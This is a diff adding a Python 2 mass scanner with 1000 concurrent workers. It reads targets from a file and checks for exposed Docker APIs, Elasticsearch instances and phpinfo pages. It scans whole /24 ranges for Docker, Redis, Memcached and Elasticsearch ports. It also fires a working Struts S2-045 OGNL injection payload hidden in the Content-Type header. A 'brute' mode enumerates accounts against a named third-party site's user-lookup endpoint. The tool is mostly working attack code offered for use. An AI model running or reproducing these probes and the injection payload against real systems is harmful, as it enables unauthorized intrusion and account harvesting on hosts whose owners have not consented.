@@ -1,0 +1,199 @@
+#!/usr/bin/env python
+# -*- encoding: utf-8 -*-
+
+import gevent
+from gevent import monkey
+monkey.patch_all()
+from gevent.pool import Pool
+from gevent.queue import PriorityQueue
+import requests
+import time
+import sys
+from lib.console_width import getTerminalSize
+
+
+class Scanner:
+    def __init__(self):
+        self.start_time = time.time()
+        self.queue = PriorityQueue()
+        self.total_count = 0
+        self.scan_count = 0
+        self._load_target()
+        self.outfile = open("log.log", 'w')
+        self.console_width = getTerminalSize()[0] - 2
+
+    def _print_msg(self, _msg=None, _found_msg=False):
+        if _msg is None:
+            msg = '%s TotalCount| %s Scanned in %.2f seconds' % (
+                    self.total_count,self.total_count - self.queue.qsize(), time.time() - self.start_time)
+            sys.stdout.write('\r' + ' ' * (self.console_width - len(msg)) + msg)
+        else:
+            sys.stdout.write('\r' + _msg + ' ' * (self.console_width - len(_msg)) + '\n')
+            self.outfile.write(_msg + '\n')
+            self.outfile.flush()
+            if _found_msg:
+                msg = '%s TotalCount| %s Scanned in %.2f seconds' % (
+                        self.total_count,self.total_count - self.queue.qsize(), time.time() - self.start_time)
+                sys.stdout.write('\r' + ' ' * (self.console_width - len(msg)) + msg)
+        sys.stdout.flush()
+
+    def _load_target(self):
+        print '[+] Read targets ...'
+        with open('target.lst') as f:
+            for line in f.xreadlines():
+                target = line.strip()
+                self.queue.put(target)
+
+        print "TotalCount is %d" % self.queue.qsize()
+        self.total_count = self.queue.qsize()
+        print "Now scanning ..."
+
+    def _scan(self,case):
+        while not self.queue.empty():
+            target = self.queue.get()
+            if case == "1":
+                self.dockerapi(target)
+            if case == "2":
+                self.s2_045(target)
+            if case == "3":
+                self.headers(target)
+            if case == "4":
+                self.weakfile(target)
+            if case == "5":
+                self.portscan_c(target)
+            if case == "6":
+                self.Elasticsearch(target)
+            if case == "7":
+                self.brute(target)
+
+
+
+#####################################################################
+#                                                                   #
+#    Vuln poc by:xi4okv QQ:48011203                                 #
+#                                                                   #
+#####################################################################
+
+    def dockerapi(self,target):
+        try:
+            res = requests.head("http://" + str(target).replace(":2375","") + ":2375/containers/json",timeout=2)
+            if res.headers['Content-Type'] == 'application/json':
+                self._print_msg(target + "==>  docker api Vuln",True)
+            else:
+                self._print_msg()
+        except:
+            self._print_msg()
+        self._print_msg()
+
+    def Elasticsearch(self,target):
+        try:
+            res = requests.head("http://" + str(target).replace(":9200","") + ":9200/_status",timeout=2)
+            if res.status_code == 200:
+                self._print_msg(target + "==>  Elasticsearch Vuln",True)
+            else:
+                self._print_msg()
+        except:
+            self._print_msg()
+        self._print_msg()
+
+
+    def headers(self,target):
+        try:
+            res = requests.head("http://" + str(target),timeout=1)
+            self._print_msg(target + "==>" + str(res.headers),True)
+        except:
+            self._print_msg()
+        self._print_msg()
+
+    def s2_045(self,target):
+        try:
+            data = {"image": " "}
+            headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
+               "Content-Type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vul','s2-045')}.multtargetart/form-data"}
+            req = requests.post("http://" + str(target), data=data, headers=headers)
+            if req.headers["vul"] == "s2-045":
+                self._print_msg(target + "==>" + "S2-045 Vuln",True)
+        except:
+            self._print_msg()
+        self._print_msg()
+
+    def weakfile(self,target):
+        weaklist = ["/i.php","/phpinfo.php"]
+        for weakfile in weaklist:
+            try:
+                res = requests.get("http://" + str(target) + weakfile,timeout=1)
+                if res.status_code == 200:
+                    if "phpinfo()" in res.content:
+                        self._print_msg("http://" + target + weakfile ,True)
+            except:
+                self._print_msg()
+        self._print_msg()
+
+
+    def brute(self,target):
+        url = "http://exam.shanyishanmei.com/account/open/getUserInfoByAccount"
+        try:
+            data = {'account':target}
+            res = requests.post(url,data=data,timeout=1)
+            if "\"errorCode\":0" in res.content:
+                self._print_msg(target ,True)
+        except:
+            self._print_msg()
+
+    def portscan_c(self,target):
+        import socket
+        ip = socket.gethostbyname(target)
+        ports = [2375,6379,11211,9200]
+        #ports = [9200]
+        ip = ip.split(".")
+        ipc = ip[0]+"."+ip[1]+"."+ip[2]+"."
+        for port in ports:
+            for i in range(255):
+                try:
+                    cs = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                    cs.settimeout(float(2.5))
+                    address=(ipc+str(i), int(port))
+                    status = cs.connect_ex((address))
+                    if status == 0:
+                        self._print_msg( ipc+str(i) + ":" + str(port) ,True)
+                except Exception ,e:
+                    pass
+                    #print "error:%s" %e
+                finally:
+                    cs.close()
+            self._print_msg()
+
+
+
+#####################################################################
+#                                                                   #
+#    Vuln runner by:xi4okv QQ:48011203                              #
+#                                                                   #
+#####################################################################
+
+
+    def run(self,case):
+        threads = [gevent.spawn(self._scan,case) for i in xrange(1000)]
+        try:
+            gevent.joinall(threads)
+        except KeyboardInterrupt, e:
+            msg = '[WARNING] User aborted.'
+            sys.stdout.write('\r' + msg + ' ' * (self.console_width - len(msg)) + '\n\r')
+            sys.stdout.flush()
+
+
+
+if __name__ == '__main__':
+    d = Scanner()
+    print "1.docker api"
+    print "2.s2-045"
+    print "3.headers"
+    print "4.weakfile"
+    print "5.portscan_c"
+    print "6.Elasticsearch"
+    print "7.brute"
+    case = raw_input("Please input case:")
+    d.run(case)
+    print "\nEnd!"
+    d.outfile.flush()
+    d.outfile.close()
